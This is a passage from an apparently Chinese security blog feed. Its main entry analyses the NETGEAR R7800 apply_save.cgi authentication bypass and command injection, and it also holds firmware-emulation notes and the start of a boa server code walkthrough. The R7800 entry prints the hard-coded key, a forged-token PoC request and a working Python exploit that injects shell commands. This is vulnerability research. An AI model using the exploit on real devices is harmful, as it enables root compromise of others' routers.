<ul>
<li>创建/var/run/upnpd.pid</li>
<li>LD_PRELOAD劫持符号，即custom_nvram</li>
<li>配置nvram.ini</li>
</ul>
</li>
<li><p>2</p>
</li>
</ul>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">cp $(<span class="built_in">which</span> qemu-arm-static) .</span><br><span class="line">qemu-arm-static -L . -g 1234 var/Sofia（-L 同chroot</span><br><span class="line"></span><br><span class="line">gdb-multiarch var/Sofia</span><br><span class="line"><span class="built_in">set</span> sysroot .</span><br><span class="line">target remote :1234</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 2</span></span><br><span class="line">lxl@ubuntu:~/Desktop/25/_mtd1ro.bin.extracted/squashfs-root$ cp $(<span class="built_in">which</span> qemu-arm-static) .</span><br><span class="line">lxl@ubuntu:~/Desktop/25/_mtd1ro.bin.extracted/squashfs-root$ ls</span><br><span class="line">1_var_Sofia  bin  boot  dev  etc  home  lib  linuxrc  mnt  opt  proc  qemu-arm-static  root  sbin  share  slv  sys  usr  var</span><br><span class="line">lxl@ubuntu:~/Desktop/25/_mtd1ro.bin.extracted/squashfs-root$ sudo chroot . ./qemu-arm-static -g 1234 1_var_Sofia </span><br><span class="line">HTTPD: fd: 6, IP: 0x18ea8c0</span><br><span class="line"></span><br><span class="line"><span class="comment"># 3</span></span><br><span class="line">cp $(<span class="built_in">which</span> qemu-arm-static) .</span><br><span class="line">qemu-arm-static -L . -g 1234 var/Sofia（-L 同chroot</span><br><span class="line"></span><br><span class="line">gdb-multiarch var/Sofia</span><br><span class="line"><span class="built_in">set</span> sysroot .</span><br><span class="line">target remote :1234</span><br></pre></td></tr></table></figure>
<ul>
<li>armx</li>
</ul>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line"><span class="comment"># devices（注意要用高内核的，其他目录下找到的</span></span><br><span class="line">rv160,qemu-system-arm-4.1.0,vexpress-a9,,,256M,zImage-3.16.57-vexpress,VEXPRESS2,rv160</span><br><span class="line"></span><br><span class="line"><span class="comment"># config</span></span><br><span class="line">armx:/armx$ cat rv160/config </span><br><span class="line">id=rv160<span class="comment"># 要与目录名一致</span></span><br><span class="line">nvram=nvram.ini<span class="comment"># 可以不用改，如下</span></span><br><span class="line">rootfs=rootfs/rootfs-101<span class="comment"># 要有权限</span></span><br><span class="line">randomize_va_space=0</span><br><span class="line">ld_preload=preload<span class="comment"># 需导入so库</span></span><br><span class="line">initcommands=<span class="string">"/bin/sh"</span><span class="comment"># 不用非得启动httpd的，可以先进shell后手动启动</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># nvram.ini，直接默认即可不影响（但有的需要改</span></span><br><span class="line">armx:/armx$ cat rv160/nvram.ini </span><br><span class="line">key1=value1</span><br><span class="line">key2=value2</span><br><span class="line">key3=value3</span><br><span class="line">key4=value4</span><br><span class="line">key5=value5</span><br><span class="line">key6=value6</span><br><span class="line">key7=value7</span><br><span class="line">key8=value8</span><br><span class="line">key9=value9</span><br><span class="line">key10=value10</span><br><span class="line"></span><br><span class="line"><span class="comment"># 手动启动mini_httpd</span></span><br><span class="line">mini_httpd -h<span class="comment"># 查看帮助</span></span><br><span class="line">mini_httpd -d /www<span class="comment"># d指定web目录</span></span><br><span class="line">netstat -atp<span class="comment"># 看到www已启动，默认80端口</span></span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>IOT安全</category>
      </categories>
      <tags>
        <tag>IOT安全</tag>
        <tag>固件模拟</tag>
      </tags>
  </entry>
  <entry>
    <title>NETGEAR R7800漏洞定位及分析</title>
    <url>/2021/03/30/iot/NETGEAR%20R7800%E6%BC%8F%E6%B4%9E%E5%AE%9A%E4%BD%8D%E5%8F%8A%E5%88%86%E6%9E%90/</url>
    <content><![CDATA[<p>[toc]</p>
<h1 id="NETGEAR-R7800漏洞定位及分析"><a href="#NETGEAR-R7800漏洞定位及分析" class="headerlink" title="NETGEAR R7800漏洞定位及分析"></a>NETGEAR R7800漏洞定位及分析</h1><blockquote>
<p>命令注入和认证绕过的组合漏洞、内网</p>
</blockquote>
<h2 id="通告"><a href="#通告" class="headerlink" title="通告"></a>通告</h2><ul>
<li>认证绕过</li>
</ul>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line"><span class="comment"># https://www.zerodayinitiative.com/advisories/ZDI-21-252/</span></span><br><span class="line">(Pwn2Own) NETGEAR Nighthawk R7800 Use of Hard-coded Password Authentication Bypass Vulnerability</span><br><span class="line"></span><br><span class="line">This vulnerability allows network-adjacent attackers to bypass authentication on affected installations of NETGEAR R7800. Authentication is not required to exploit this vulnerability.</span><br><span class="line"></span><br><span class="line">The specific flaw exists within the apply_save.cgi endpoint. This issue results from the use of hard-coded encryption key. An attacker can leverage this vulnerability to execute arbitrary code <span class="keyword">in</span> the context of root.</span><br></pre></td></tr></table></figure>
<ul>
<li>命令注入</li>
</ul>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line"><span class="comment"># https://www.zerodayinitiative.com/advisories/ZDI-21-262/</span></span><br><span class="line">(Pwn2Own) NETGEAR R7800 apply_save.cgi rc_service Command Injection Remote Code Execution Vulnerability</span><br><span class="line"></span><br><span class="line">This vulnerability allows network-adjacent attackers to execute arbitrary code on affected installations of NETGEAR R7800. Although authentication is required to exploit this vulnerability, the existing authentication mechanism can be bypassed.</span><br><span class="line"></span><br><span class="line">The specific flaw exists within the handling of the rc_service parameter provided to apply_save.cgi. The issue results from the lack of proper validation of a user-supplied string before using it to execute a system call. An attacker can leverage this vulnerability to execute code <span class="keyword">in</span> the context of root.</span><br></pre></td></tr></table></figure>
<h2 id="准备"><a href="#准备" class="headerlink" title="准备"></a>准备</h2><ul>
<li>官网信息</li>
</ul>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line"><span class="comment"># https://kb.netgear.com/000062883/Security-Advisory-for-Multiple-Vulnerabilities-on-Some-Routers-Satellites-and-Extenders</span></span><br><span class="line">R7800, running firmware versions prior to 1.0.2.80</span><br><span class="line"></span><br><span class="line"><span class="comment"># https://www.netgear.com/support/product/R7800.aspx#download</span></span><br><span class="line">最新10280</span><br><span class="line">较新10278</span><br><span class="line"></span><br><span class="line"><span class="comment"># 时间</span></span><br><span class="line">2020-12-31 - Vulnerability reported to vendor</span><br><span class="line">80：Last Updated:01/18/2021</span><br><span class="line">78：Last Updated:12/04/2020</span><br></pre></td></tr></table></figure>
<ul>
<li><p>版本选择；官网通告80前，cve上76，故76 vs 80万无一失（78 vs 80也行</p>
</li>
<li><p>串口</p>
</li>
</ul>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line"><span class="comment"># win安装驱动</span></span><br><span class="line">ch340G土豪金、CH341SER.EXE</span><br><span class="line"><span class="comment"># xshell</span></span><br><span class="line">协议serial、端口号com3（com1为自带的）、波特率115200</span><br></pre></td></tr></table></figure>
<ul>
<li>打印日志辅助分析</li>
</ul>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 输出日志的代码逻辑</span></span><br><span class="line"><span class="function">FILE *<span class="title">print_log</span><span class="params">(<span class="keyword">int</span> file, <span class="keyword">int</span> func, <span class="keyword">int</span> line, <span class="keyword">int</span> num, <span class="keyword">char</span> *format, ...)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  result = fopen(<span class="string">"/tmp/funjsq_log_level"</span>, <span class="string">"r"</span>); <span class="comment">// 手动创建此文件 </span></span><br><span class="line">  fp_1 = result;</span><br><span class="line">  <span class="keyword">if</span> ( result )</span><br><span class="line">  &#123;</span><br><span class="line">    fgets(s, <span class="number">64</span>, fp_1);</span><br><span class="line">    nptr = strtok(s, <span class="string">"\t\n"</span>);</span><br><span class="line">    <span class="keyword">if</span> ( nptr )</span><br><span class="line">      log_level = atoi(nptr);                   <span class="comment">// 获取日志等级 </span></span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> ( num &lt;= log_level )                       <span class="comment">// 目前已看到最大的num=8，故 内容设为9</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( !access(<span class="string">"/tmp/funjsqd1000"</span>, <span class="number">0</span>) )       <span class="comment">// 不能存在此文件</span></span><br><span class="line">    &#123;</span><br><span class="line">    &#125;</span><br><span class="line">    result = access(<span class="string">"/tmp/funjsqd2000"</span>, <span class="number">0</span>);     <span class="comment">// 手动创建此文件</span></span><br><span class="line">                                                <span class="comment">// access，文件存在返回0</span></span><br><span class="line">    <span class="keyword">if</span> ( !result )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">strcpy</span>(log_file, <span class="string">"/tmp/funjsq_log"</span>);      <span class="comment">// 手动创建此文件 </span></span><br><span class="line">      v26 = fopen(log_file, <span class="string">"at+"</span>);             <span class="comment">// 写日志必用到fopen</span></span><br><span class="line">      <span class="keyword">if</span> ( v26 )</span><br><span class="line">      &#123;</span><br><span class="line">        <span class="built_in">fprintf</span>(v26, <span class="string">" %s/%s/%d  "</span>, file, func, line);<span class="comment">// 写入日志文件 </span></span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// 手动配置</span></span><br><span class="line">root@R7800:~<span class="meta"># ls funjsq*</span></span><br><span class="line">funjsq_httpd.pid    funjsq_log_level    funjsqd2000</span><br><span class="line">funjsq_log          funjsq_resolv.conf</span><br><span class="line">root@R7800:~<span class="meta"># cat funjsq_log_level</span></span><br><span class="line"><span class="number">9</span></span><br><span class="line">root@R7800:~<span class="meta"># tail -f funjsq_log</span></span><br></pre></td></tr></table></figure>
<h2 id="命令注入"><a href="#命令注入" class="headerlink" title="命令注入"></a>命令注入</h2><ul>
<li>过程</li>
</ul>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line"><span class="comment"># https://www.zerodayinitiative.com/advisories/ZDI-21-262/</span></span><br><span class="line">(Pwn2Own) NETGEAR R7800 apply_save.cgi rc_service Command Injection Remote Code Execution Vulnerability</span><br><span class="line"></span><br><span class="line">This vulnerability allows network-adjacent attackers to execute arbitrary code on affected installations of NETGEAR R7800. Although authentication is required to exploit this vulnerability, the existing authentication mechanism can be bypassed.</span><br><span class="line"></span><br><span class="line">The specific flaw exists within the handling of the rc_service parameter provided to apply_save.cgi. The issue results from the lack of proper validation of a user-supplied string before using it to execute a system call. An attacker can leverage this vulnerability to execute code <span class="keyword">in</span> the context of root.</span><br><span class="line"><span class="comment"># 通告中：apply_save.cgi、rc_service、system</span></span><br><span class="line"><span class="comment"># 字符串rc_service</span></span><br><span class="line">找到my_vulnee_apply_cgi函数，交叉引用找到结构体数组</span><br><span class="line"><span class="comment"># 字符串apply_save.cgi</span></span><br><span class="line">alt+b找到结构体数组</span><br><span class="line"><span class="comment"># 函数system</span></span><br><span class="line">并非直接调用，而是通过call_system函数来间接调用的</span><br><span class="line"><span class="comment"># bindiff</span></span><br><span class="line">并未发现修改，修复了认证绕过，这个自然就修了（前者是后者的前提，故如此修复</span><br></pre></td></tr></table></figure>
<ul>
<li>漏洞点</li>
</ul>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 参数action_mode、rc_service</span></span><br><span class="line">int __fastcall my_vulnee_apply_cgi(FILE *a1, int a2, int a3, int a4, const char *a5)</span><br><span class="line">&#123;</span><br><span class="line">  action_mode = my_getvalue(<span class="string">"action_mode"</span>); <span class="comment"># 需指定为apply</span></span><br><span class="line">  <span class="keyword">if</span> ( !action_mode )</span><br><span class="line">    action_mode = byte_31634;</span><br><span class="line">  s1 = action_mode;</span><br><span class="line">  <span class="keyword">if</span> ( !strcmp(s1, <span class="string">"apply"</span>) )</span><br><span class="line">  &#123;</span><br><span class="line">    rc_service = my_getvalue(<span class="string">"rc_service"</span>);<span class="comment"># 待注入参数</span></span><br><span class="line">    <span class="keyword">if</span> ( !rc_service )</span><br><span class="line">      rc_service = byte_31634;</span><br><span class="line">    cmd = rc_service;</span><br><span class="line">    <span class="keyword">if</span> ( rc_service &amp;&amp; *cmd )</span><br><span class="line">      call_system(cmd);                         <span class="comment"># inject</span></span><br><span class="line">      </span><br><span class="line"><span class="comment"># 间接调用system</span></span><br><span class="line">int __fastcall call_system(const char *a1)</span><br><span class="line">&#123;</span><br><span class="line">  system(a1);</span><br><span class="line">  <span class="built_in">return</span> 1;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h2 id="认证绕过"><a href="#认证绕过" class="headerlink" title="认证绕过"></a>认证绕过</h2><ul>
<li>过程</li>
</ul>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 通告中：hard-coded encryption key.</span></span><br><span class="line">找到可疑字符串</span><br><span class="line">.rodata:00031B08 key             DCB <span class="string">"3apatqHBKnhJxFP4fJ2oC3IXNnazo03g"</span>,0</span><br><span class="line"><span class="comment"># 结合bindiff</span></span><br><span class="line">0.7076943740519013	0.976390702552711	00017660	sub_00017660	Normal	00017BC4	sub_00017BC4	Normal</span><br></pre></td></tr></table></figure>
<ul>
<li>漏洞点</li>
</ul>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 旧，v76，硬编码的key</span></span><br><span class="line">bool __fastcall my_vulnee2_check_token(const char *old_token)</span><br><span class="line">&#123;</span><br><span class="line">  char key[128]; // [sp+1Ch] [bp-90h] BYREF</span><br><span class="line">  char *new_token; // [sp+9Ch] [bp-10h]</span><br><span class="line">  const char *v6; // [sp+A0h] [bp-Ch]</span><br><span class="line">  char *router_MAC; // [sp+A4h] [bp-8h]</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> ( !old_token || strlen(old_token) != 32 )</span><br><span class="line">    <span class="built_in">return</span> 0;</span><br><span class="line">  router_MAC = get_router_MAC();</span><br><span class="line">  <span class="keyword">if</span> ( !router_MAC )</span><br><span class="line">    router_MAC = get_router_MAC();</span><br><span class="line">  <span class="keyword">if</span> ( !router_MAC )</span><br><span class="line">    <span class="built_in">return</span> 1;</span><br><span class="line">  v6 = <span class="string">"3apatqHBKnhJxFP4fJ2oC3IXNnazo03g"</span>;</span><br><span class="line">  memset(key, 0, sizeof(key));</span><br><span class="line">  sprintf(key, <span class="string">"%s|%s"</span>, router_MAC, <span class="string">"3apatqHBKnhJxFP4fJ2oC3IXNnazo03g"</span>);</span><br><span class="line">  print_log(<span class="string">"apply.c"</span>, <span class="string">"check_token"</span>, 495, 3, <span class="string">"str=%s"</span>, key);</span><br><span class="line">  new_token = make_token(key);</span><br><span class="line">  <span class="keyword">if</span> ( !new_token || strlen(new_token) &lt;= 31 )</span><br><span class="line">    <span class="built_in">return</span> 1;</span><br><span class="line">  print_log(<span class="string">"apply.c"</span>, <span class="string">"check_token"</span>, 502, 3, <span class="string">"nt=%s, ot=%s"</span>, new_token, old_token);</span><br><span class="line">  <span class="built_in">return</span> strncasecmp(new_token, old_token, 32u) == 0;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment"># 新，v80，远程身份认证</span></span><br><span class="line">bool __fastcall check_t(const char *token)</span><br><span class="line">&#123;</span><br><span class="line">  char cmd[256]; // [sp+14h] [bp-118h] BYREF</span><br><span class="line">  char *nptr; // [sp+114h] [bp-18h]</span><br><span class="line">  char *router_MAC; // [sp+118h] [bp-14h]</span><br><span class="line">  int v7; // [sp+11Ch] [bp-10h]</span><br><span class="line">  char *ip; // [sp+120h] [bp-Ch]</span><br><span class="line">  const char *host; // [sp+124h] [bp-8h]</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> ( !token || strlen(token) != 32 )</span><br><span class="line">    <span class="built_in">return</span> 0;</span><br><span class="line">  memset(cmd, 0, sizeof(cmd));</span><br><span class="line">  host = <span class="string">"wxapi.funjsq.com"</span>;</span><br><span class="line">  ip = 0;</span><br><span class="line">  v7 = 0;</span><br><span class="line">  sprintf(cmd, <span class="string">"%s/funjsq_nslookup %s"</span>, <span class="string">"/data/funjsq/bin"</span>, <span class="string">"wxapi.funjsq.com"</span>);</span><br><span class="line">  print_log(<span class="string">"apply.c"</span>, <span class="string">"check_t"</span>, 483, 5, <span class="string">"----主进程-----------cmd=%s--------------\n"</span>);</span><br><span class="line">  ip = get_config_value(cmd);</span><br><span class="line">  router_MAC = get_router_MAC();</span><br><span class="line">  <span class="keyword">if</span> ( strchr(ip, <span class="string">'.'</span>) )</span><br><span class="line">    sprintf(</span><br><span class="line">      cmd,</span><br><span class="line">      <span class="string">"curl -s -H 'Host:%s' -d 'm=%s'  -d 't=%s' https://%s/wxMini/v2/cm/ck -k  -m 10 "</span>,</span><br><span class="line">      host,</span><br><span class="line">      router_MAC,</span><br><span class="line">      token,</span><br><span class="line">      ip);</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">    sprintf(cmd, <span class="string">"curl -s -d 'm=%s'  -d 't=%s'   https://%s/wxMini/v2/cm/ck -k -m 10 "</span>, router_MAC, token, host);</span><br><span class="line">  print_log(<span class="string">"apply.c"</span>, <span class="string">"check_t"</span>, 494, 4, <span class="string">"cmd=%s"</span>);</span><br><span class="line">  nptr = get_config_value(cmd);</span><br><span class="line">  print_log(<span class="string">"apply.c"</span>, <span class="string">"check_t"</span>, 498, 4, <span class="string">"ret=%s"</span>);</span><br><span class="line">  <span class="built_in">return</span> atoi(nptr) == 1;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h2 id="poc"><a href="#poc" class="headerlink" title="poc"></a>poc</h2><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 需要AccessToken</span></span><br><span class="line">GET /apply_save.cgi?action_mode=apply&amp;rc_service=sleep<span class="variable">$&#123;IFS&#125;</span>333 HTTP/1.1</span><br><span class="line">Host: 192.168.1.1:12300</span><br><span class="line">Connection: keep-alive</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.66 Safari/537.36</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9</span><br><span class="line">Sec-Fetch-Site: 5</span><br><span class="line">Sec-Fetch-Mode: navigate</span><br><span class="line">AccessToken: 095A29B5D928CE40B9190BA7438472CD </span><br><span class="line">Content-Length: 0</span><br><span class="line">Sec-Fetch-User: ?1</span><br><span class="line">Sec-Fetch-Dest: document</span><br><span class="line">Accept-Encoding: gzip, deflate, br</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.9</span><br><span class="line">Content-Length: 0</span><br><span class="line"></span><br><span class="line"><span class="comment"># 生成AccessToken：md5、mac地址、硬编码的key</span></span><br><span class="line">md5(<span class="string">"8C:3B:AD:B7:EF:35|3apatqHBKnhJxFP4fJ2oC3IXNnazo03g"</span>) = 095A29B5D928CE40B9190BA7438472CD</span><br></pre></td></tr></table></figure>
<h2 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h2><p>获取mac：<a href="https://www.jb51.net/article/49661.htm" target="_blank" rel="noopener">https://www.jb51.net/article/49661.htm</a></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> scapy.all <span class="keyword">import</span> srp,Ether,ARP</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"><span class="comment"># ignore InsecureRequestWarning</span></span><br><span class="line"><span class="keyword">from</span> requests.packages.urllib3.exceptions <span class="keyword">import</span> InsecureRequestWarning</span><br><span class="line">requests.packages.urllib3.disable_warnings(InsecureRequestWarning)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_mac</span><span class="params">(target_ip)</span>:</span></span><br><span class="line">    ipscan = <span class="string">"%s/24"</span>%target_ip</span><br><span class="line">    ans,unans = srp(Ether(dst=<span class="string">"FF:FF:FF:FF:FF:FF"</span>)/ARP(pdst=ipscan),timeout=<span class="number">2</span>,verbose=<span class="keyword">False</span>)</span><br><span class="line">    <span class="keyword">for</span> snd,rcv <span class="keyword">in</span> ans:</span><br><span class="line">        mac = rcv.sprintf(<span class="string">"%Ether.src%"</span>)</span><br><span class="line">        ip = rcv.sprintf(<span class="string">"%ARP.psrc%"</span>)</span><br><span class="line">        <span class="comment"># print(mac,ip)</span></span><br><span class="line">        <span class="keyword">if</span> ip == target_ip:</span><br><span class="line">            <span class="keyword">return</span> mac.upper()</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">exp</span><span class="params">(token)</span>:</span></span><br><span class="line">    url = <span class="string">"https://%s:12300/apply_save.cgi?action_mode=apply&amp;rc_service=%s"</span> %(target_ip,cmd)</span><br><span class="line">    token = make_token(mac)</span><br><span class="line">    headers = &#123;</span><br><span class="line">        <span class="string">"AccessToken"</span>: token,</span><br><span class="line">    &#125;</span><br><span class="line">    res = requests.get(url,headers = headers,verify=<span class="keyword">False</span>)</span><br><span class="line">    print(res.status_code)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">make_token</span><span class="params">(mac)</span>:</span></span><br><span class="line">    raw = <span class="string">'%s|%s'</span> %(mac.upper(),key)</span><br><span class="line">    token = hashlib.md5(raw.encode(encoding=<span class="string">'UTF-8'</span>)).hexdigest()</span><br><span class="line">    <span class="keyword">return</span> token.upper()</span><br><span class="line"></span><br><span class="line">key = <span class="string">"3apatqHBKnhJxFP4fJ2oC3IXNnazo03g"</span></span><br><span class="line">target_ip = <span class="string">"192.168.1.1"</span></span><br><span class="line">cmd = <span class="string">"sleep$&#123;IFS&#125;222"</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    mac = get_mac(target_ip)<span class="comment">#8C:3B:AD:B7:EF:35</span></span><br><span class="line">    <span class="comment">#mac = "8C:3B:AD:B7:EF:35"</span></span><br><span class="line">    <span class="comment">#print(mac)</span></span><br><span class="line">    token = make_token(mac)<span class="comment">#095A29B5D928CE40B9190BA7438472CD</span></span><br><span class="line">    <span class="comment">#print(token)</span></span><br><span class="line">    exp(token)</span><br></pre></td></tr></table></figure>
<h2 id="利用限制"><a href="#利用限制" class="headerlink" title="利用限制"></a>利用限制</h2><ul>
<li>需微信绑定“游戏加速器”</li>
<li>设备重置后，token依然留在设备中</li>
</ul>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 不存在nvram中</span></span><br><span class="line">nvmra show |grep 095A29B5D928CE40B9190BA7438472CD</span><br><span class="line"></span><br><span class="line"><span class="comment"># 存在redis数据库中</span></span><br><span class="line">root@R7800:/data/funjsq/config/redis<span class="comment"># ps|grep redis</span></span><br><span class="line">17684 root        420 S   /data/funjsq/bin/funjsq_redis -d /data/funjsq/config/</span><br><span class="line">20009 root        368 S   grep redis</span><br><span class="line"><span class="comment"># 完整命令</span></span><br><span class="line">root@R7800:/data/funjsq/config/redis<span class="comment"># cat /proc/17684/cmdline</span></span><br><span class="line">/data/funjsq/bin/funjsq_redis<span class="_">-d</span>/data/funjsq/config/redis</span><br><span class="line"></span><br><span class="line"><span class="comment"># 数据存放位置</span></span><br><span class="line">/data/funjsq/config/redis目录下的0.udbData中</span><br><span class="line"></span><br><span class="line"><span class="comment"># 验证是否需要绑定</span></span><br><span class="line">清空0.udbData文件（事先备份），杀掉redis并重新启动（因为数据已读取到内存中），再次测试exp，发现失败，说明需要绑定</span><br></pre></td></tr></table></figure>
<h2 id="漏洞修复"><a href="#漏洞修复" class="headerlink" title="漏洞修复"></a>漏洞修复</h2><ul>
<li>认证绕过和命令注入组合漏洞，只修复了前者，后者也就不能执行了</li>
<li>猜测：前者是后者的前提，故如此修复</li>
</ul>
<h2 id="其它"><a href="#其它" class="headerlink" title="其它"></a>其它</h2><ul>
<li>严格来讲，并非命令注入（sprintf拼接字符串后再system才是），接收参数后直接调system，没有注入到命令字符串，算是系统的自带功能，概念问题，不必过分纠结</li>
<li>token为32个字节，共256比特，大胆猜测md5，以免扣代码</li>
<li>最新v80，v78也受影响</li>
<li>实时查看日志：tail + grep</li>
</ul>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 绑定的瞬间会有token</span></span><br><span class="line">root@R7800:~<span class="comment"># tail -f funjsq_log|grep token</span></span><br><span class="line">[2021-03-25 10:56:13]  [INFO]  httpd.c/auth_check/402  [httpd] token tail:095A29B5D928CE40B9190BA7438472CD, none</span><br><span class="line">[2021-03-25 10:56:13]  [INFO]  httpd.c/handle_request/1015  old auth_token=095A29B5D928CE40B9190BA7438472CD</span><br><span class="line"> 2021-03-25 10:56:13]  [INFO]  httpd.c/handle_request/1016  header access_token=none</span><br><span class="line">[2021-03-25 10:56:30]  [DEBUG]  httpd.c/auth_check/399  [httpd] token success:095A29B5D928CE40B9190BA7438472CD, 095A29B5D928CE40B9190BA7438472CD</span><br><span class="line">Terminated</span><br></pre></td></tr></table></figure>
<ul>
<li>测试前先搞清楚端口号</li>
</ul>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">21226 root       1232 S   /data/funjsq/bin/funjsq_httpd -p 12300 -s root</span><br><span class="line">root@R7800:~<span class="comment"># cat /proc/21226/cmdline</span></span><br><span class="line">/data/funjsq/bin/funjsq_httpd-p12300-sroot</span><br></pre></td></tr></table></figure>
<ul>
<li><p>组合漏洞：cve号一般是连着的或接近的，zdi号不一定，根据情况向前或向后找（注入27256、认证绕过27254、之前误以为是27255，应组合54和56</p>
</li>
<li><p>tftp向外传输文件：./busybox-armv4tl tftp -p -l funjsq_log_level 192.168.1.3（put上传、local本地文件</p>
</li>
</ul>
]]></content>
      <categories>
        <category>IOT安全</category>
      </categories>
      <tags>
        <tag>路由器</tag>
        <tag>漏洞分析</tag>
        <tag>认证绕过</tag>
        <tag>命令注入</tag>
      </tags>
  </entry>
  <entry>
    <title>嵌入式设备web服务器-boa</title>
    <url>/2021/03/18/iot/%E5%B5%8C%E5%85%A5%E5%BC%8F%E8%AE%BE%E5%A4%87web%E6%9C%8D%E5%8A%A1%E5%99%A8-boa/</url>
    <content><![CDATA[<p>[toc]</p>
<h1 id="0-94-14rc21"><a href="#0-94-14rc21" class="headerlink" title="0.94.14rc21"></a>0.94.14rc21</h1><p><a href="http://www.boa.org/boa-0.94.14rc21.tar.gz" target="_blank" rel="noopener">http://www.boa.org/boa-0.94.14rc21.tar.gz</a></p>
<h2 id="boa-c：main"><a href="#boa-c：main" class="headerlink" title="boa.c：main"></a>boa.c：main</h2><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span> *argv[])</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> server_s;               <span class="comment">/* boa socket */</span></span><br><span class="line">    <span class="keyword">pid_t</span> pid;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// umask命令指定在建立文件时预设的权限掩码。umask可用来设定[权限掩码]，类似chmod 777</span></span><br><span class="line">    <span class="comment">/* set umask to u+rw, u-x, go-rwx */</span></span><br><span class="line">    <span class="comment">/* according to the man page, umask always succeeds */</span></span><br><span class="line">    umask(<span class="number">077</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// time_t time(time_t *seconds) 返回自纪元起经过的时间，以秒为单位</span></span><br><span class="line">    <span class="comment">/* but first, update timestamp, because log_error_time uses it */</span></span><br><span class="line">    (<span class="keyword">void</span>) time(&amp;current_time);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 设置时区</span></span><br><span class="line">    <span class="comment">/* set timezone right away */</span></span><br><span class="line">    tzset();</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 复制dev/null到标准输入文件描述符</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="comment">// 先打开，获取fd</span></span><br><span class="line">        <span class="keyword">int</span> devnullfd = <span class="number">-1</span>;</span><br><span class="line">        devnullfd = open(<span class="string">"/dev/null"</span>, <span class="number">0</span>);</span><br><span class="line">        <span class="comment">//log_error_mesg_fatal的宏，打印出错时日志信息</span></span><br><span class="line">        <span class="comment">/* make STDIN point to /dev/null */</span></span><br><span class="line">        <span class="keyword">if</span> (devnullfd == <span class="number">-1</span>) &#123;</span><br><span class="line">            DIE(<span class="string">"can't open /dev/null"</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">// 将fd复制，之后用STDIN_FILENO即同效果</span></span><br><span class="line">        <span class="comment">// STDIN_FILENO 0   /* standard input file descriptor */</span></span><br><span class="line">        <span class="keyword">if</span> (dup2(devnullfd, STDIN_FILENO) == <span class="number">-1</span>) &#123;</span><br><span class="line">            DIE(<span class="string">"can't dup2 /dev/null to STDIN_FILENO"</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">// 关闭原来的fd</span></span><br><span class="line">        (<span class="keyword">void</span>) close(devnullfd);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    parse_commandline(argc, argv);<span class="comment">// 解析命令行参数</span></span><br><span class="line">    fixup_server_root();<span class="comment">// 确保服务器的根目录是有效的</span></span><br><span class="line">    read_config_files();<span class="comment">// 读取配置文件</span></span><br><span class="line">    create_common_env();<span class="comment">// 设置cgi相关的常用环境变量</span></span><br><span class="line">    open_logs();<span class="comment">// 日志相关</span></span><br><span class="line">    server_s = create_server_socket();<span class="comment">// 创建socket</span></span><br><span class="line">    init_signals();<span class="comment">// 设置信号的处理函数</span></span><br><span class="line">    build_needs_escape();<span class="comment">// 字符相关</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// 后台运行，fork新进程</span></span><br><span class="line">    <span class="comment">/* background ourself */</span></span><br><span class="line">    <span class="keyword">if</span> (do_fork) &#123;</span><br><span 